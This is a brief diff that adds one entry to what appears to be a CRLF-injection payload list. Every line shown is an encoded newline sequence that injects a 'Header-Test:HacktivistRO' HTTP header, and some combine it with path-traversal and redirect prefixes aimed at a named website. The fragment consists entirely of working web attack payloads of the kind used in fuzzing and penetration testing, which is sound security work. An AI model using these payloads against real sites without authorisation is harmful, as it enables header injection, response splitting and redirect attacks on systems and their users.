@@ -56,6 +56,7 @@ crlf%0D%0A%09Header-Test:HacktivistRO
 %25%30AHeader-Test:HacktivistRO
 %25%30%61Header-Test:HacktivistRO
 %u000AHeader-Test:HacktivistRO
+%u000AX-Header-Test:HacktivistRO
 //www.rohanwebsite.in/%2F%2E%2E%0D%0AHeader-Test:HacktivistRO
 /www.rohanwebsite.in/%2E%2E%2F%0D%0AHeader-Test:HacktivistRO
 /rohanwebsite.in/%2F..%0D%0AHeader-Test:HacktivistRO
